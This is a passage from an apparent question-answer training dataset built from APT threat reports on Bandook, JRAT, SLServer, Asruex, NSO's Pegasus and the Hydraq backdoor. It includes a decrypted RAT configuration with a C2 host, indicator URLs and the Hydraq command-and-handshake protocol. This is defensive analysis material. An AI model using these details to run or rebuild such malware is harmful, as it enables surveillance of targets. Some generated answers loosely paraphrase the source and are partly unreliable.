systems that JRAT can infect it is perhaps not surprising that the attackers chose this particular RAT.\ndelayms=\u00ad1 addresses=axroot.com:5006,\nhiddenfile=false\nicon=\u00ad1\nmutex=false\nerror=true\ntitle=\nrunnextboot=false\ntimeout=false\ndroppath=2 tititle=jRAT melt=false\ntoms=\u00ad1\nreconsec=10\nmport=\u00ad1 perms=\u00ad1 id=Name5006\nper=false os=win mac linux\npass=7110eda4d09e062aa5e4a390b0a572ac0d2c0220 debugmsg=true\nmessage= delay=false ti=true\nvm=false\ntimsgfail=Disconnected from controller name=japs timsg=Connected to control controller window=false\nFig. 8 A decrypted JRat config file\nSmall Headline: Core Functionality\nAll Bandook executables are similar in size. Generally, they are masqueraded with fake Flash Player, Office document, or PDF document icons. None of the Bandook samples we have found in this campaign have been configured so as to execute an actual decoy document.\nNormally, Bandook is distributed with an initial stub. This executable would contain another PE32 binary as an embedded PE resource. Bandook makes use of a common technique referred to as \"process hollowing.\" It instantiates several suspended browser processes and then replaces the loaded executable memory with the code contained in the embedded resource previously mentioned.\nAs an example for analysis, we take the original binary with hash b002e8b6406fbdf3de9bfcb3493e61c8a44b331f53125e8fed9daa351 c49fd34 and, more importantly, the embedded resource named \"O9897DDD\" with hash c447fd4d6e1deb794acde683bb2176becf353c6e1b2acdfced27c4413 711f6f0.\nInterestingly, this binary was uploaded on malwr.com in early June 2016 with the file name \"Form13.exe\" (which might suggest a development version). Currently, the same binary doesn't seem to be available in any other malware repository to which we have access. In this case, the malware did not execute after having successfully identified a virtualized environment, which might suggest the upload was potentially done by the authors as an attempt to verify the evasion technique.\nIt is also worth noting that while normally the embedded resource is obfuscated in binaries distributed in the wild, this specific case is the only one we identified with the resource embedded in the clear.\nSmall Headline: Network Indicators and Modularity\nAfter some initialization, Bandook performs an initial beacon with the general information and configuration details it previously collected. Then it expects a command in response from the Command & Control server. If idle, the C&C will reply with \"@0000\", and the malware will keep beaconing back the title bar of the currently active window, until it is instructed to do something else.\nInterestingly, the basic payload isn't provided with the code to perform any significant action. If instructed to do so, Bandook will download additional DLL files which provide the specifically desired functionality. This is probably meant to limit the exposure of the core modules to analysts, and to vet the infection before performing a full deployment.\nIn this case the available DLLs can have the names:\ncap.dll extra.dll\npws.dll tv.dll\nAmmyy.dll\nWe were able to obtain the first three DLLs, which were located at the URL hxxp://axroot.com/plg10/.\nThe following is a list of overall features available in this version of Bandook:\n\u25cf Screen capture\n\u25cf Webcam recording\n\u25cf Audio recording\n\u25cf File search, creation, deletion and exfiltration\n\u25cf Spawn a shell\n\u25cf Get list of available Wireless networks\n\u25cf Get list of MTP devices\n\u25cf Monitor USB devices\nRead the text above and answer this question: How does the modular design of Bandook enhance its ability to perform various malicious actions, and what specific functionalities are available through its downloadable DLLs?",
    "output": "The modular design of Bandook enhances its ability to perform various malicious actions by allowing it to download additional DLL files that provide specific functionalities only when needed. This approach limits the exposure of the core modules to analysts and vets the infection before performing a full deployment. The specific functionalities available through its downloadable DLLs include screen capture, webcam recording, audio recording, file search, creation, deletion and exfiltration, spawning a shell, getting a list of available wireless networks, getting a list of MTP devices, and monitoring USB devices. This modularity makes Bandook a powerful and flexible tool for cyber espionage and surveillance.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: SLServer Malware Family\ny The SLServer sample we received was also recently analyzed and reported by (<http://pwc.blogs.com/cyber_security_updates/2016/03/taiwant-election-targetting.html>)PwC. It was presented in an overview of threat actors making use of the recent Taiwanese presidential election in email lures to entice targets to open malicious documents. As noted by PwC, this file is a self\u00adextracting archive ultimately responsible for downloading a binary from a website that was likely compromised. Like PwC, we were unable to obtain the final Keyainst.exe binary due to the behaviour of the C2 during the time of analysis.\nAnother recently observed instance of this malware found on VirusTotal (MD5: (<https://virustotal.com/en/file/83f967523fb0904cb14ced4e84d1f299c51ff7f33a2a68348dac47e06f3fa2d2/analysis/>)cfcd2a90e87156e1a811f9c7b0051002) was designed to communicate with the same C2 server and contains the following debug path:\ne:\\Working\\SVNProject\\SLServer\\SLServer2.0\\release\\SLServer.pdb\nInterestingly, according to VirusTotal, the previously mentioned UP007 dropper fzyy.exe was also observed hosted as wthk.txt at the same URL as this downloaded SLServer sample. The precise timeframes during which these samples were hosted and changed remains unknown. Table 6 shows the timestamps of their initial upload to VirusTotal.\nBig Headline: SLServer \u2013 Possible Second Stage\nThe SLServer sample (MD5: (<https://virustotal.com/en/file/4018b934ee0ccdd0e469e56acadc66e2d5c11260f35340a6560c2db91f4e3612/analysis/>)e5e7dcbda781dd0bf5f5da3cccdb094d) calls \"FunctionWork\" from a DLL:\nOn VirusTotal we discovered a file named javaupdata.dll (MD5: (<https://virustotal.com/en/file/5b598a760115ecc3bc972e808fc8550682e527f2d1352acef5fc6baada31916a/analysis/>)<7332245f67b6b8a256ab22a6496b4536), which exports a function by the same name. Strings in the SLServer sample also reference a file by this name. When executed, this DLL contacts 210.61.12[.]153 using SSL. This host is the same one pointed to by the SLServer's C2 domain, safetyssl.security-centers[.]com. Interestingly, while the 210.61.12[.]153 host did not respond to the SLServer connections during analysis time, the host did accept the SSL connections from javaupdata.dll. Further analysis of this file is ongoing.\nBig Headline: SLServer Command and Control Infrastructure\nThe SLServer C2 server: safetyssl.security-centers[.]com resolved to the IP address: 210.61.12[.]153 at the time of analysis. This IP is hosted in Taiwan on the hosting provider (<http://www.cht.com.tw/en/aboutus/aboutcht.html>)Chunghwa Telecom, specifically their Data Communication Business Group offering. It appears to host the site of a Taiwanese auto parts manufacturer, Yowjung Autoparts. This site may have been either compromised or copied from a legitimate source.\nThe domain name security-centers.com (<https://whois.domaintools.com/security-centers.com>)was registered on September 11 2015 by the e\u00admails: janmiller-domain@googlemail[.]com and an_ardyth@123mail[.]org. Using Passive DNS data we find the following subdomains were used in the time period after domain registration:\nsafetyssl.security-centers[.]com computer.security-centers[.]com security-centers[.]com www.security-centers[.]com\nThe domain computer.security-centers[.]com was a C2 server previously reported by (<https://www.arbornetworks.com/blog/asert/wp-content/uploads/2016/01/ASERT-Threat-Intelligence-Brief-2015-08-Uncovering-the-Seven-Pointed-Dagger.pdf>)ASERT related to a sample of the Trochilus RAT analyzed in the report. ASERT retrieved that sample from the compromised Myanmar Union Election Commission website. The other subdomains (www and the the top level security-centers[.]com) are likely the default IP addresses for GoDaddy registered domains. The hosting information for this infrastructure is presented in the Figure 7.\nMedium Headline: Recent Campaign Connections\nIn January 2016, Arbor Networks released a report titled \"(<http://www.arbornetworks.com/blog/asert/uncovering-the-seven-pointed-dagger/>)Uncovering the Seven Pointed Dagger\" in which they discuss a series of six RAR files hosted on the Myanmar election commission website on 20 October 2015. The focus of the report was on the discovery of the new Trochilus RAT. However, one of the RAR files was noted as unknown malware. This sample (Security-Patch-Update.exe, MD5: 82896b68314d108141728a4112618304) is also UP007, signed with the 5D 11 78 4F B8 17 65 02 3F 89 A4 F4 24 3F E1 A9 certificate and configured to communicate with 59.188.12[.]123 directly over port 8008, identical to fzyy.exe mentioned above. In this instance, if any of the previously discussed registry keys were present, the sample will execute the dropped runas.exe binary. Given this execution, nvsvc.exe is likely also an older component. As discussed above the UP007 sample we analyzed shares the same C2 (computer.security-centers[.]com) as the Trochilus RAT sample reported by (<http://www.arbornetworks.com/blog/asert/uncovering-the-seven-pointed-dagger/>)ASERT.\nIn November 2015, Palo Alto Networks reported on a newly discovered trojan referred to as (<http://researchcenter.paloaltonetworks.com/2015/11/attack-campaign-on-the-government-of-thailand-delivers-bookworm-trojan/>)Bookworm. They revealed a campaign focused on the targeting of government entities in Thailand. The campaign used a malware family known as FFRAT, and the sample described in the report connected to the domain hkemail.f3322[.]org for command and control. In August 2015, the same domain was reportedly used to host an instance of UP007 as well.\nFinally, the relationship between the SLServer C2 www.olinaodi[.]com and our previous research into the (<https://citizenlab.org/2013/08/surtr-malware-family-targeting-the-tibetan-community/>)Surtr malware family was highlighted by PwC through the overlap in the toucan6712@163[.]com registrant. We (<https://targetedthreats.net/>)tracked malware campaigns using the Surtr family that have targeted Tibetan organizations since 2013.\nMedium Headline: Conclusion\nThis latest espionage campaign against Hong Kong activists appears to be connected to a broader set of targets, and operations. The recent detailed reporting by (<https://www.arbornetworks.com/blog/asert/wp-content/uploads/2016/01/ASERT-Threat-Intelligence-Brief-2015-08-Uncovering-the-Seven-Pointed-Dagger.pdf>)ASERT makes it clear that the UP007 malware family has been found in previous campaigns targeting Burmese interests. In addition, the campaigns share some C2 infrastructure with previous operations against targets in Thailand and the Tibetan community. The domain registration connections between SLServer infrastructure and Surtr infrastructure also suggests some level of potential coordination between campaigns targeting Hong Kong groups and the Tibetan community. Despite these connections, it is unclear if these campaigns are being conducted by the same threat actor.\nWe cannot exclude the possibility that distinct operators have a degree of sharing of tools and infrastructure. Alternatively, security researcher Ned Moran has articulated a concept of a \"(<https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/rpt-malware-supply-chain.pdf>)digital quartermaster,\" to refer to an actor that supplies threat infrastructure and malware development resources to multiple groups. While these scenarios are plausible, we do not have enough data to properly assess these competing hypotheses, or to make conclusive statements about the identity of the threat actors.\nWhat is clear from our analysis is that civil society groups across Asia continue to be targeted by persistent and organized cyber espionage campaigns. Civil society often lack the resources and awareness to defend against these operations and closer attention to the threats they face is needed.\n\nBased on the above text, answer a question. What are the key similarities and differences between the SLServer sample analyzed in this report and the one reported by PwC, particularly in terms of their behavior and C2 communication?",
    "output": "The SLServer sample analyzed in this report and the one reported by PwC both involve a self-extracting archive designed to download a binary from a compromised website. Both samples were unable to obtain the final Keyainst.exe binary due to the behavior of the C2 server during analysis. Another instance of SLServer found on VirusTotal communicates with the same C2 server and contains a debug path indicating its development environment. Additionally, the UP007 dropper fzyy.exe was hosted at the same URL as the SLServer sample, suggesting a connection between these two malware families.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: Summary\nAsruex is a relatively new kind of malware that has been seen since around October 2015. It is likely that targeted attacks using Asruex will continue.\nHash values of artifacts demonstrated in this article are described in Appendix C. Also, destination URLs confirmed by JPCERT/CC are listed in Appendix D. It is recommended to make sure that the hosts you use are not accessing these URLs.\nThanks for reading.\n- Shusei Tomonaga\n(Translated by Yukako Uchida)\n\nQuestion: Why is it important for cybersecurity experts to monitor and block the destination URLs associated with the Asruex malware? How does this practice contribute to the overall defense strategy against such targeted attacks?\n\nAnswer:",
    "output": "Monitoring and blocking the destination URLs associated with the Asruex malware is crucial because it helps prevent infected systems from communicating with command and control servers. By doing so, cybersecurity experts can disrupt the attack chain, making it difficult for the attackers to exfiltrate data or receive further instructions. This practice is part of a broader defense strategy aimed at containing and mitigating the impact of targeted attacks. Blocking these URLs ensures that even if a system becomes compromised, the malware cannot perform its intended malicious activities, thus enhancing the overall security posture.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nBig Headline: 2. Ahmed Mansoor Targeted With iPhone Zero-Day\nAhmed Mansoor is an (<https://www.amnesty.org/en/latest/news/2015/10/ahmed-mansoor-selected-as-the-2015-laureate-martin-ennals-award-for-human-rights-defenders/>)internationally recognized human rights defender, blogger, and member of Human Rights Watch's (<https://www.hrw.org/news/2011/04/09/uae-government-detains-human-rights-defender>)advisory committee. Mansoor, who is based in the UAE, was jailed for eight months in 2011 along with four other activists for (<https://www.hrw.org/news/2011/09/22/uae-free-activists-elections>)supporting a pro-democracy petition. After he was released, Mansoor's (<http://www.martinennalsaward.org/index.php?option=com_content&view=article&id=254%3Aahmed-mansoor-martin-ennals-award-2015-final-nominee&catid=44%3Apress&Itemid=152&lang=en>)passport was confiscated, his (<http://www.nytimes.com/2016/05/30/technology/governments-turn-to-commercial-spyware-to-intimidate-dissidents.html>)car was stolen, and $140,000 disappeared from his bank account. Mansoor is banned from traveling overseas, and his work continues to attract significant harassment and punishment\nOn the morning of August 10, 2016, Mansoor received an SMS text message that appeared suspicious. The next day he received a second, similar text. The messages promised \"new secrets\" about detainees tortured in UAE prisons, and contained a hyperlink to an unfamiliar website. The messages arrived on Mansoor's stock iPhone 6 running iOS 9.3.3.\nMansoor quickly forwarded the messages to Citizen Lab researchers for investigation. He has good reason to be concerned about unsolicited messages: every year since 2011, Mansoor has been targeted with spyware attacks, including with FinFisher spyware in 2011 and (<https://citizenlab.org/2012/10/backdoors-are-forever-hacking-team-and-the-targeting-of-dissent/>)Hacking Team spyware in (<https://citizenlab.org/2012/10/backdoors-are-forever-hacking-team-and-the-targeting-of-dissent/>)2012 (see Section 8: Ahmed Mansoor and Previous UAE Attacks ).\nMedium Headline: Figure 3: SMS text messages received by Mansoor (English: \"New secrets about torture of Emiratis in state prisons\"). The sender's phone numbers are spoofed.\nWhen Mansoor's messages reached us, we recognized the links: the domain name webadv.co belongs to a network of domains that we believe to be part of an exploit infrastructure provided by the spyware company NSO Group (see Section 6: Linking NSO Group Products to the Attack on Mansoor). We had first come across the NSO Group infrastructure during the course of our earlier research into (<https://citizenlab.org/2016/05/stealth-falcon/>)Stealth Falcon, a UAE-based threat actor (see Section 5: Tracking a Mobile Attack Infrastructure).\nWhen we first found the infrastructure and connected it to NSO Group, we hypothesized that operators of the NSO Group spyware would target a user by sending them an infection link containing one of the exploit infrastructure domain names. Though we had previously found several public occurrences of links involving these domains on Twitter (see Section 7: Evidence of Other Targets), none of the links we found seemed to be active (i.e., none produced an infection when we tested them). In other exploit infrastructures with which we are familiar (e.g., (<https://wikileaks.org/hackingteam/emails/emailid/121783>)Hacking Team's exploit infrastructure), we had noted that operators prefer to deactivate such links after a single click, or after a short period of time, perhaps in order to prevent the disclosure of the exploit to security researchers.\nWe accessed the link Mansoor provided us on our own stock factory-reset iPhone 5 (Mansoor had an iPhone 6) with iOS 9.3.3 (the same version as Mansoor). When we clicked the link, we saw that it was indeed active, and watched as unknown software was remotely implanted on our phone. This suggested that the link contained a zero-day iPhone remote jailbreak: a chain of heretofore unknown exploits used to remotely circumvent iPhone security measures. To verify our observations, we shared our findings with Lookout Security. Both research teams determined that Mansoor was targeted with a zero-day iPhone remote jailbreak. The chain of exploits, which we are calling the Trident, included the following (see Section 4: The Trident iOS Exploit Chain and Payload for more details):\nThe implant installed by the Trident exploit chain would have turned Mansoor's iPhone into a digital spy in his pocket. The spyware, which appears to be NSO's Pegasus spyware solution, was capable of employing his iPhone's camera and microphone to eavesdrop on activity in the vicinity of the device, recording his WhatsApp and Viber calls, logging messages sent in mobile chat apps, and tracking his movements.\nBig Headline: 3. NSO Group and the Pegasus Solution\nThe attack on Mansoor appears to have used Pegasus, a remote monitoring solution sold by (<http://www.haaretz.com/israel-news/business/1.574805>)NSO Group Technologies Ltd (see Section 6: Linking NSO Group Products to the Attack on Mansoor). NSO Group, based in Herzelia, Israel (CR# 514395409), develops and sells mobile phone surveillance software to governments around the world. The company describes itself as a \"leader\" in \"(<https://www.documentcloud.org/documents/815991-1276-nso-group-brochure-pegasus.html>)mobile and cellular Cyber Warfare,\" and has been operating for more than six years since its founding in 2010.\nNSO Group has largely avoided the kind of high profile media attention that companies like Hacking Team and FinFisher have sometimes courted. The company maintains no website, there is little concrete information about NSO Group's Pegasus product available online, and we know of no prior technical analysis of NSO Group's products or infrastructure.\nSome previous media reports have linked (<http://foreignpolicy.com/2016/01/22/the-espionage-econom>)NSO Group (<http://impresa.prensa.com/panorama/Virzi-ligado-compra-equipo-Pegasus_0_4267073341.html>)and Pegasus to a scandal involving potential illegal eavesdropping in Panama, and possible (<https://privacyinternational.org/sites/default/files/global_surveillance.pdf>)sales to Mexico. Other reports have suggested that NSO Group's activities have (<http://blogs.wsj.com/digits/2014/08/01/can-this-israeli-startup-hack-your-phone/>)aroused concern within the United States intelligence community .\nTwo of NSO Group's three co-founders, Shalev Hulio and Omri Lavie, are also co-founders of mobile security company Kaymera, which promises a \"Multi Layered Cyber Defense Approach\" to clients. On Kaymera's website, the company reprints a Bloomberg article pointing out that they \"(<https://www.kaymera.com/httpwww-bloomberg-comnews2014-09-29israeli-entrepreneurs-play-both-sides-of-the-cyber-wars-html/>)play both sides of the cyber wars.\" The article also quotes NSO Group's CEO, who suggests that they entered the defense business when potential clients saw the capabilities of NSO Group's tools.\n\nWhy was the discovery of the Trident exploit chain considered a rare and significant find in the field of cybersecurity? What implications does this discovery have for future research and defense against similar attacks?",
    "output": "The discovery of the Trident exploit chain was considered a rare and significant find because it represented the first known instance of an iPhone remote jailbreak used in the wild as part of a targeted attack campaign. This discovery highlighted the sophistication and potential impact of zero-day exploits on widely used devices like iPhones. The implications for future research and defense include the need for continuous monitoring and analysis of exploit infrastructures, improved collaboration between security researchers, and enhanced awareness among users about the risks associated with unsolicited messages and links. Additionally, it underscores the importance of developing robust security measures to protect against advanced and evolving cyber threats.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nMedium Headline: Russian Hacker Forums Fueled Georgia Cyber Attacks\nAn exhaustive inquiry into August's cyber attacks on the former Soviet bloc nation of Georgia finds no smoking gun in the hands of the Russian government. But experts say evidence suggests that Russian officials did little to discourage the online assault, which was coordinated through a Russian online forum that appeared to have been prepped with target lists and details about Georgian Web site vulnerabilities well before the two countries engaged in a brief but deadly ground, sea and air war.\nThe findings come from an open source investigation launched byProject Grey Goose, a volunteer effort by more than 100 security experts from tech giants like Microsoft and Oracle, as well as former members of the Defense Intelligence Agency, Lexis-Nexis, theDepartment of Homeland Security and defense contractor SAIC, among others.\nThe group began its inquiry shortly after the cyber war disabled a large number of Georgia government Web sites. Starting with the Russian hacker forum Xaker.ru (hacker.ru), investigators found a posting encouraging would-be cyber militia members to enlist at a private, password-protected online forum called StopGeorgia.ru. Grey Goose principal investigator Jeff Carr said the administrators of the hacker forum were keenly aware that American cyber sleuths were poking around: Within hours after discovering the link to the StopGeorgia site, Xaker.ru administrators deleted the link and banned all access from U.S.-based Internet addresses.\nAt StopGeorgia.ru, project members unearthed a top-down hierarchy of expert hackers who doled out target lists of Georgian government Web sites to relative novices, complete with instructions on how to exploit vulnerabilities in the sites in order to render them inaccessible. Following a July defacement of the Georgian president's Web site that was blamed on Russian hackers, the Georgian government blocked Russian Internet users from visiting government Web sites.\nBut Carr said StopGeorgia administrators also equipped recruits with directions on evading those digital roadblocks, by routing their attacks through Internet addresses in other Eastern European nations. The level of advance preparation and reconnaissance strongly suggests that Russian hackers were primed for the assault by officials within the Russian government and or military, Carr said.\n\"The fact that the StopGeorgia.ru site was up and running within hours of the ground assault -- with full target lists already vetted and with a large member population -- was evidence that this effort did not just spring up out of nowhere,\" said Carr, speaking at a forum in Tysons Corner, Va., sponsored by Palantir Technologies, an In-Q-Tel funded company in Palo Alto, Calif., whose data analysis software helped Grey Goose investigators track the origins and foot soldiers involved in the cyber attack. \"If they were planning ahead of the invasion, how did they know the invasion was going to occur? The only way they could have known that is if they were told.\"\nInitially, security experts assumed that the sites were felled via \"distributed denial of service\" (DDoS) attacks, a well-known method of assault that uses hundreds or thousands of compromised personal computers to flood a targeted site with so much junk traffic that it can no longer accommodate legitimate visitors. But investigators soon learned that attackers were instructed in the ways of a far more simple but equally effective attack strategy capable of throttling a targeted Web site using a single computer.\nSecurity researcher and Grey Goose investigator Billy Rios said attackers disabled the sites using a built-in feature of MySQL, a software suite widely used by Web sites to manage back-end databases. The \"benchmark\" feature in MySQL allows site administrators to test the efficiency of database queries, but last year hackers posted online instructions for exploiting the benchmark feature to inject millions of junk queries into a targeted database, such that the Web servers behind the site become so tied up with bogus instructions that they effectively cease to function.\n\"Not only can a small number of users bring down the back end databases, it indicates that there was some form of planning, reconnaissance, and some technical sophistication by some of the members,\" Rios said. \"It also indicates that all the information from the attacked systems was most likely already compromised and pilfered before the injection point was posted.\"\nWhile Grey Goose members could find no direct link between Russian government officials and the StopGeorgia.ru forum administrators, they claim it is unreasonable to conclude that no such connection exists.\n\"The historical record shows clear support by members of the Russian government and implied consent in its refusal to intervene or stop the hacker attacks,\" the report states, naming at least three Russian politicians and military officials who have previously endorsed coordinated cyber attacks against other nations as a show of nationalistic pride.\nOleg Gordievsky, a former colonel in the Russian KGB who defected to the British intelligence wing MI6 in 1985, spoke in 1998 at an international conference on crime and discussed how Russian hackers convicted of cyber crime are sometimes offered an alternative to prison -- working for the FSB\" (the federal security service of the Russian Federation and a successor to the KGB).\nAccording to a cyber warfare analysis by researchers at Dartmouth College, Moscow has a track record of offensive hacking into Chechen Web sites. The researchers provide this account of incidents in 2002, when Russian hackers used cyber warfare in to supplement the ongoing military conflict with Chechnya.\n\"In 2002, Chechen rebels claimed that two of their Web sites, kavkaz.org and chechenpress.com, crashed under hack attacks by the Russian FSB security service. The website crashes were reportedly timed to occur concurrently or shortly after Russian Special Forces troops stormed the Moscow Theater in which the rebels had taken hostages. \"On October 26 ... our Web Site kavkaz.org was attacked by a group of hackers,\" said a spokesman for the Chechen rebel site run by Movladi Udugov. Following the attack on the site, which is based in the United States, Udugov said that he was \"amazed Russia's special services can operate so freely on U.S. territory.\" The attacks on one site, chechenpress.com, fell under the category of brute-force denial of service (DoS) attacks, while on the other site, kavkaz.org, the attacks appeared much more sophisticated.\nAccording to Chechen sources, the Web site was hijacked by hackers from the FSB. The FSB hackers reportedly accomplished this by changing the domain registration of the site and then eliminating the data for the site from the hosting server. Upon learning of these attacks, the rebels moved the information on the sites to kavkazcenter.com. However, that site was attacked just a week later, also apparently the work of FSB hackers.\nIn July, Russian hackers were blamed for a similar assault on Lithuanian government Web sites. In Security Fix's account of that attack, I posted a copy of a congratulatory letter sent to nationalist Russian hackers by Nikolai Kuryanovich, a former member of the Russian Duma. The missive is dated March 2006, and addresses the hacker group Slavic Union after the group had just completed a series of successful attacks against Israeli Web sites.\n\"In the very near future many conflicts will not take place on the open field of battle, but rather in spaces on the Internet, fought with the aid of information soldiers, that is hackers,\" Kuryanovich wrote. \"This means that a small force of\nhackers is stronger than the multi-thousand force of the current armed forces.\"\nThe Grey Goose report concludes that the journeyman-apprentice relationship observed in the StopGeorgia forum will continue to be the training model used by nationalistic Russian hackers, and that those hackers are actively engaged in finding more efficient ways to disable networks.\nIn the meantime, Carr said, the Russian government will continue to deny any involvement in any nation-level cyber attacks.\n\"The Russian government has adopted this hands-off and satisfying position of deniability while enjoying the rewards achieved by the Russian hacker community,\" Carr said.\n\nWhat specific attack strategy was used to disable Georgian websites, and why was it considered effective despite being relatively simple?",
    "output": "The attackers used a built-in feature of MySQL, a software suite widely used by websites to manage back-end databases, to disable the Georgian websites. The 'benchmark' feature in MySQL was exploited to inject millions of junk queries into a targeted database, overwhelming the Web servers and causing them to effectively cease functioning. This strategy was effective because it allowed a small number of users to bring down the back-end databases, indicating planning, reconnaissance, and technical sophistication among the attackers.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Very Small Headline: 3.4.2 SYNchronize-ACKnowledgement\n[Listing 07 - Constructing Initial Handshake routine ]\nThe client will identify the initial SYN packet sent by the server. If valid, the client will respond a SYNchronize ACKnowledgement packet 20 bytes in size. The sets of bytes are encrypted using a bitwise XOR with 0xCC as the key.\nCC CC CC CC CD CC CC CC CD CC CC CC CC CC CC CC AA AA AA AA\n[Listing 08 - Acknowledgment data decryption routine ]\nThe server will validate the SYN-ACK packet from the client expecting the following decrypted values:\n00 00 00 00   01 00 00 00   01 00 00 00   00 00 00 00  00 00 00 00\nTake note that,\nVery Small Headline: 3.4.3 ACKnowledge\nOnce the server receives the expected SYN-ACK packet, it will respond by sending an ACKnowledgement of receipt. The following tasks are performed:\na. Collect the following information from the compromised system.\n\u2022 Computer name\n\u2022 CPU clock speed\n\u2022 Memory status \u2013 specifically gets the amount of actual physical memory in bytes and converts it to megabytes.\n\u2022 Operating system information\n[ Listing 09 - Collected system information ]\nb. Encrypt the information collected using a custom encryption were the key used is derived from the result of GetTickCount API. The encrypted data will be encrypted again using a bitwise NOT.\nc. Generate a CRC hash value of the encrypted information.\nd. Send the collected information to the client.\nThe server is now ready to accept backdoor commands from the remote attacker.\nThe complete 3-way handshake process between the backdoor server and the client will look like this:\n[Listing 12 - The backdoor 3-way handshake process]\nVery Small Headline: 3.5.1 Client's Information Header Format\n[Figure 1 - The client process the server information header.]\nThe constructed information header is 20 bytes in size in the following format: (Note: The values in Table 01 are for illustration purpose only)\n[Table 01 - Client's Information Header Format]\nThe client's Command Reference and Task will be discussed in the section \"\". It is important to take note that the information from the server is encrypted using a bitwise NOT, while the information from the client is encrypted using a bitwise XOR with 0xCC as the key. (see Listing 12)\n[Table 02 - Information Header Definition]\nVery Small Headline: 3.5.2 Server's Information Header Format\n[Figure 02 - The client process the server information header.]\nThe constructed information header is 20 bytes in size with the following format. (Note: The values in Table 03 are for illustration purpose)\n[Table 03 - Server's Information Header Format]\nThe difference between the client and server header information is the Server Info Reference (offset 0x00) and Information Code (offset 0x04). Based on our simulation and code inspection, the backdoor client uses the following numeric codes to identify the content of the received information: (Note: The Backdoor Command and Task is discussed in section )\n[Table 04 - Server Information Header Definition]\nSmall Headline: 3.6 Backdoor Command Reference\nAside from the malware code obfuscated with JMPs and NOPs, Win32/Hydraq also constructs a reference table that will be used by the Command Reference field found in the to convert the actual commands.\nOnce the server receives a packet from the client, it performs the following task to convert the client's Command Reference value:\n1. Perform a bitwise XOR with 0xCC as the key in the information transmitted.\n2. The value in the Command Reference field will be added with negative two (-2).\n3. Match the value obtained in Step 2 in the Table 05 to get the Actual Command.\nTo elaborate on this further, let's take an example where the remote attacker requests information about the logical drive of the compromised system.\nIn Table 05, the Command Reference for retrieving the logical drive is Command 0x04. (see Table 06 for Backdoor Command and Task reference)\nIn this example, the Command Reference is CA CC CC CC, and the Task Number is CC CC CC CC.\nConverting the correct instruction to execute:\n[Table 05 - Backdoor Command Reference]\n3. Resulting match:\nListing 13 displays the captured communication between the client and server retrieving the logical drive information of the compromised system.\n[Listing 13 - Captured client server communication ]\nSmall Headline: 3.7 Backdoor Command Table\nThe Win32/Hydraq backdoor features 10 command switches, which theoretically allow the remote attacker to perform almost everything. An attacker can manipulate files, registries, services, process, privileges, search files and directories, remote download, update configurations, open applications, and steal any desired information. Attackers can initiate real-time graphical control and watch a user's desktop using Command 0x07 Task 0x0b (see Appendix D for discussion of acelpvc.dll and VedioDriver.dll installation).\n[Table 06 - Backdoor Command and Task Descriptions]\nSmall Headline: 3.9 Backdoor Commands In Action\n\"Primary goal of the attackers was accessing the Gmail accounts of Chinese human rights activist\"\n- statement published in a Google blog post entitled \"A new approach to China\".\nMalware designed for spying and obtaining sensitive information must have the following offensive capabilities:\n1. Probing - the act of searching, exploring, and investigating.\n2. Exfiltration of sensitive information.\n3. Surveillance - the ability to capture images, audio and/or video.\n4. Covert Communication Channel - is a hidden communication embedded into the header and/ or payload of an overt communication channel to avoid discovery of on-going attacks over the network.\n5. Covering Tracks - the ability to stay undetected and avoid forensic discovery.\nLet's summarize and see what we have learned and discovered from Hydraq's code.\nVery Small Headline: 3.9.1 Probing and exfiltration of sensitive information\nThe Windows Registry is the heart of the Windows Operating System. It stores users profile, installed applications, privileges for applications and folders, hardware profiles, current logged-on information, mounted devices, the MRU list, wireless network information, LAN computers and passwords [10].\nUsing Command 0x03 Task 0x00 and Task 0x01, a remote attacker using Hydraq can substantially extract useful information from Windows Registry.\nUsing Command 0x01 Task 0x00, a remote attacker using Hydraq can find out the services that are available on the compromised system. Windows services display what type of connections is available that attackers can take advantage of to administer further attacks.\nUsing Command 0x04 Task 0x00, a remote attacker using Hydraq can determine all logical drives and if the disk drive is a removable, fixed, CD-ROM, or network drive. (see Backdoor Command Reference Listing 13 for the captured communication of client-server)\nThe attacker can then execute Command 0x04 Task 0x07 to search a directory or Command 0x06 Task 0x01 to search a file.\nThrough Command 0x03, a remote attacker using Hydraq can manipulate the registry and use Command 0x05 Task 09 to store and update gathered information. Command 04 Task 09 retrieves the stored information and assures the integrity of the file sent to remote attacker.\nThe backdoor can retrieve any file and information at anytime using Command 0x06 Task 01.\nHydraq reads the contents of network.ics using Command 0x09 Task 0x01. Network.ics contains information including network name and number mapping for local area network.\nThe attacker can manipulate the routing table to redirect traffic to the compromised system. The Command 0x04 Task 0x02 can be used to open or execute a file or program, and Command 0x04 Task 0x08 can be use to update network.ics content.\nThus, it can perform a man-in-the-middle attack, where attacker can intercept traffic and capture information.\nVery Small Headline: 3.9.2 Surveillance\nHydraq probing capabilities can determine whether the compromised machine has audio/video enabled applications and devices (for example instant messengers and webcam connection). The attacker can use available application and devices to capture images, voice and video for surveillance.\nHowever, as discussed earlier, Hydraq can also initiate a real-time graphical control and watch a user's desktop using Command 0x07 Task 0x0B (see Appendix D for discussion of acelpvc.dll and VedioDriver.dll installation).\nVery Small Headline: 3.9.4 Covering Tracks\nCovering tracks is important in hacking. It extends or allows the attacker to stay undetected for a long period of time. It also removes evidence of hacking and lessens the chances of identification.\nIf Hydraq can escalate privileges it can also adjust them; if it can execute and run any program/ application, it can terminate it. It can remove its traces in services, registry, file/s, folder/s, change file attributes and move file/s into different locations. It can also force shutdowns or reboot the system, which can remove valuable traces in memory to avoid digital forensics discovery.\nFurthermore, in Command 0x04 Task 0x02 the remote attacker can clear Application Event logs.\n1 Overt channel is any communication path for the authorized data transmission within a computer system or network. HTTP and HTTP SSL is an overt channel.\nVery Small Headline: 3.9.5 Expandable Features\nIn Command 0x02 Task 0x00, the remote attacker can download and execute arbitrary files onto compromised systems, and it can adjust process token privileges using Command 0x00 Task 0x00. This sets of commands further expands the capability of the attacks.\nCommand 0x00\nTask 0x00\nAdjust Token Privilege / Access Privilege Escalation and Enumerate Process.\nThe backdoor configuration that is stored in the registry can be updated using Command 05 Task 0x08. This means that the remote attacker can modify and change the connection details at anytime.\nAnswer this question: What information does the Hydraq server collect from the 